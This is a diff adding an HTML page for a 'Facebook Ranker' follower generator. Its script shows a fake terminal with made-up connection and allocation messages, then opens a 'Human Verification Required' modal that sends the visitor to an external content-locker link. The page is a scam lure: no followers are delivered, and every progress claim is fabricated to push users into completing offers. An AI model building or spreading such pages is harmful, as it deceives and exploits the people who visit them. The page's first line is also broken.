@@ -1,0 +1,178 @@
+<!DOCTYPE html> <htm
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Ranker - Followers Generator</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap');
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        .mono-code {
+            font-family: 'JetBrains Mono', monospace;
+        }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col justify-between selection:bg-blue-600 selection:text-white">
+    <!-- Top Navigation / Header -->
+    <header class="w-full bg-slate-900/80 backdrop-blur-md border-b border-slate-800 sticky top-0 z-50">
+        <div class="max-w-4xl mx-auto px-4 py-3 flex items-center justify-between">
+            <div class="flex items-center space-x-3">
+                <div class="w-10 h-10 rounded-xl bg-blue-600 flex items-center justify-center shadow-lg shadow-blue-500/30">
+                    <svg class="w-6 h-6 text-white fill-current" viewBox="0 0 24 24">
+                        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                    </svg>
+                </div>
+                <div>
+                    <h1 class="font-bold text-lg tracking-tight text-white flex items-center gap-2">
+                        Facebook Ranker 
+                        <span class="text-xs bg-blue-500/20 text-blue-400 font-semibold px-2 py-0.5 rounded-full border border-blue-500/30">v2.5 API</span>
+                    </h1>
+                    <p class="text-xs text-slate-400">Automated Follower Distribution Network</p>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Main Container -->
+    <main class="max-w-2xl w-full mx-auto px-4 py-8 flex-grow space-y-6">
+        
+        <!-- Hero Banner Card -->
+        <div class="bg-gradient-to-br from-slate-900 to-slate-900/90 border border-slate-800 rounded-3xl p-6 shadow-2xl relative overflow-hidden">
+            <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-blue-600/10 rounded-full blur-3xl pointer-events-none"></div>
+            
+            <div class="text-center space-y-2 mb-6">
+                <span class="inline-flex items-center gap-1.5 py-1 px-3 rounded-full text-xs font-medium bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> Server Online • Ready
+                </span>
+                <h2 class="text-2xl font-extrabold tracking-tight text-white">Instant Follower Booster</h2>
+                <p class="text-sm text-slate-400 max-w-md mx-auto">Connect your Facebook profile or page link and allocate organic followers securely via the API gateway.</p>
+            </div>
+            <!-- Input Form -->
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-1.5">Target Facebook URL / Username</label>
+                    <div class="relative">
+                        <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1"/></svg>
+                        </span>
+                        <input type="url" id="fb-url" placeholder="https://facebook.com/your.profile" class="w-full pl-11 pr-4 py-3.5 bg-slate-950/80 border border-slate-700/80 rounded-xl text-sm text-white placeholder-slate-600 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition">
+                    </div>
+                </div>
+                <!-- Follower Packages Grid (5, 10, 30, 50, 100) -->
+                <div>
+                    <label class="block text-xs font-bold uppercase tracking-wider text-slate-400 mb-1.5">Select Follower Package</label>
+                    <div class="grid grid-cols-5 gap-2" id="package-grid">
+                        <button onclick="selectPackage(5, this)" class="pkg-btn py-3 px-2 bg-slate-950 border border-slate-700 rounded-xl font-bold text-sm text-white hover:border-blue-500 transition text-center focus:outline-none">5</button>
+                        <button onclick="selectPackage(10, this)" class="pkg-btn py-3 px-2 bg-slate-950 border border-slate-700 rounded-xl font-bold text-sm text-white hover:border-blue-500 transition text-center focus:outline-none">10</button>
+                        <button onclick="selectPackage(30, this)" class="pkg-btn py-3 px-2 bg-slate-950 border border-blue-600 bg-blue-600/10 rounded-xl font-bold text-sm text-blue-400 transition text-center focus:outline-none shadow-lg shadow-blue-600/20 active-pkg">30</button>
+                        <button onclick="selectPackage(50, this)" class="pkg-btn py-3 px-2 bg-slate-950 border border-slate-700 rounded-xl font-bold text-sm text-white hover:border-blue-500 transition text-center focus:outline-none">50</button>
+                        <button onclick="selectPackage(100, this)" class="pkg-btn py-3 px-2 bg-slate-950 border border-slate-700 rounded-xl font-bold text-sm text-white hover:border-blue-500 transition text-center focus:outline-none">100</button>
+                    </div>
+                </div>
+                <!-- Generate Button -->
+                <button onclick="startRanker()" class="w-full mt-2 py-4 px-6 bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white font-bold rounded-xl shadow-xl shadow-blue-600/30 transition transform active:scale-[0.99] flex items-center justify-center gap-2">
+                    <span>Generate Followers Now</span>
+                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                </button>
+            </div>
+        </div>
+        <!-- Terminal / Execution Box (Hidden by default) -->
+        <div id="terminal-box" class="hidden bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl space-y-4">
+            <div class="flex items-center justify-between border-b border-slate-800 pb-3">
+                <div class="flex items-center space-x-2">
+                    <div class="w-3 h-3 rounded-full bg-red-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500"></div>
+                    <div class="w-3 h-3 rounded-full bg-emerald-500"></div>
+                    <span class="text-xs font-mono text-slate-400 ml-2">api-ranker-terminal.sh</span>
+                </div>
+                <span id="progress-percent" class="text-xs font-mono font-bold text-blue-400">0%</span>
+            </div>
+            <!-- Progress Bar -->
+            <div class="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
+                <div id="progress-bar" class="bg-gradient-to-r from-blue-600 to-emerald-400 h-full w-0 transition-all duration-300"></div>
+            </div>
+            <!-- Log Output -->
+            <div id="terminal-logs" class="mono-code text-xs text-slate-300 space-y-1.5 h-36 overflow-y-auto bg-slate-950 p-3 rounded-xl border border-slate-800/80">
+                <p class="text-slate-500">[System] Initializing connection socket...</p>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="w-full text-center py-6 text-xs text-slate-500 border-t border-slate-900">
+        &copy; 2026 Facebook Ranker API Gateway. All rights reserved.
+    </footer>
+    <!-- Verification Modal -->
+    <div id="verify-modal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-md w-full p-6 text-center space-y-4 shadow-2xl relative">
+            <div class="w-16 h-16 bg-blue-600/10 text-blue-500 rounded-full flex items-center justify-center mx-auto border border-blue-500/20 shadow-lg shadow-blue-500/10">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+            </div>
+            <div>
+                <h3 class="text-xl font-bold text-white">Human Verification Required</h3>
+                <p class="text-xs text-slate-400 mt-1">To prevent bot spam on the Facebook API gateway, please complete one quick verification offer to instantly dispatch your followers.</p>
+            </div>
+            <!-- Target Locker Link Trigger Button -->
+            <button onclick="window.location.href='https://unlock-file.com/?6a74555'" class="w-full py-3.5 px-6 bg-blue-600 hover:bg-blue-500 text-white font-bold rounded-xl shadow-lg shadow-blue-600/30 transition transform active:scale-95 flex items-center justify-center gap-2">
+                <span>Verify & Send Followers</span>
+                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+            </button>
+            <p class="text-[10px] text-slate-500">Followers will automatically queue after successful verification.</p>
+        </div>
+    </div>
+    <!-- JavaScript Logic -->
+    <script>
+        let selectedCount = 30; // Default
+        function selectPackage(count, element) {
+            selectedCount = count;
+            document.querySelectorAll('.pkg-btn').forEach(btn => {
+                btn.className = "pkg-btn py-3 px-2 bg-slate-950 border border-slate-700 rounded-xl font-bold text-sm text-white hover:border-blue-500 transition text-center focus:outline-none";
+            });
+            element.className = "pkg-btn py-3 px-2 bg-slate-950 border border-blue-600 bg-blue-600/10 rounded-xl font-bold text-sm text-blue-400 transition text-center focus:outline-none shadow-lg shadow-blue-600/20";
+        }
+        function startRanker() {
+            const urlInput = document.getElementById('fb-url').value.trim();
+            if (!urlInput) {
+                alert('Please enter your Facebook Profile or Page URL first.');
+                document.getElementById('fb-url').focus();
+                return;
+            }
+            // Show terminal
+            const terminalBox = document.getElementById('terminal-box');
+            terminalBox.classList.remove('hidden');
+            terminalBox.scrollIntoView({ behavior: 'smooth' });
+            const logs = document.getElementById('terminal-logs');
+            const progressBar = document.getElementById('progress-bar');
+            const progressPercent = document.getElementById('progress-percent');
+            logs.innerHTML = `<p class="text-slate-400">[Connecting] Establishing secure gateway socket...</p>`;
+            progressBar.style.width = '0%';
+            progressPercent.innerText = '0%';
+            setTimeout(() => {
+                logs.innerHTML += `<p class="text-blue-400">[Target] Validating URL: ${urlInput}</p>`;
+                progressBar.style.width = '25%';
+                progressPercent.innerText = '25%';
+                logs.scrollTop = logs.scrollHeight;
+            }, 800);
+            setTimeout(() => {
+                logs.innerHTML += `<p class="text-blue-400">[API] Allocating package: <span class="text-emerald-400">${selectedCount} Followers</span></p>`;
+                progressBar.style.width = '55%';
+                progressPercent.innerText = '55%';
+                logs.scrollTop = logs.scrollHeight;
+            }, 1800);
+            setTimeout(() => {
+                logs.innerHTML += `<p class="text-emerald-400">[Success] Node handshake verified. Finalizing queue...</p>`;
+                progressBar.style.width = '100%';
+                progressPercent.innerText = '100%';
+                logs.scrollTop = logs.scrollHeight;
+            }, 2800);
+            // Open verification modal after terminal finishes
+            setTimeout(() => {
+                document.getElementById('verify-modal').classList.remove('hidden');
+            }, 3600);
+        }
+    </script>
+</body>
+</html>
